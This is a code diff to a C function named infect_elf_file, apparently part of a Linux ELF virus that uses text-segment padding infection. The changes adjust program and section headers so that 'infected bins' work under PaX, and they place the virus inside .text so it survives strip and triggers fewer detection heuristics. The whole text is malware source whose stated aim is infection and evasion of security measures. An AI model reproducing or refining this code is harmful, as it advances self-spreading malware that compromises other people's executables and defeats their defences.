@@ -423,13 +423,17 @@ Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
                 if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R|PF_X)) {
                                 origText = phdr[i].p_vaddr;
                                 phdr[i].p_vaddr -= paddingSize;
-                                new_base = phdr[i].p_vaddr;
 				phdr[i].p_paddr -= paddingSize;
                                 phdr[i].p_filesz += paddingSize;
                                 phdr[i].p_memsz += paddingSize;
-				//phdr[i].p_flags |= PF_W;
-                                text_found = 1;
-                }
+				phdr[i].p_align = 0x1000; // this will allow infected bins to work with PaX :)
+				new_base = phdr[i].p_vaddr;
+				text_found = 1;
+                } else {
+			if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset && (phdr[i].p_flags & PF_W))
+				phdr[i].p_align = 0x1000; // also to  allow infected bins to work with PaX :)
+		}
+		
         }
         if (!text_found) {
                 DEBUG_PRINT("Error, unable to locate text segment in target executable: %s\n", target->path);
@@ -439,7 +443,11 @@ Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
 	shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
 	char *StringTable = &mem[shdr[ehdr->e_shstrndx].sh_offset];
 	for (i = 0; i < ehdr->e_shnum; i++) {
-#if DEBUG
+	/*
+	 * This makes the Virus strip safe, as it will be contained within a section now.
+	 * It also makes it so that the e_entry still points into the .text section which
+	 * may set off less heuristics.
+	 */
                 if (!_strncmp((char *)&StringTable[shdr[i].sh_name], ".text", 5)) {
                         shdr[i].sh_offset = sizeof(ElfW(Ehdr)); // -= (uint32_t)paddingSize;
 			shdr[i].sh_addr = origText - paddingSize;
@@ -447,8 +455,7 @@ Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
                         shdr[i].sh_size += self->size;
                 }  
                 else 
-#endif
-		shdr[i].sh_offset += paddingSize;
+			shdr[i].sh_offset += paddingSize;
 
 	}
 	ehdr->e_shoff += paddingSize;
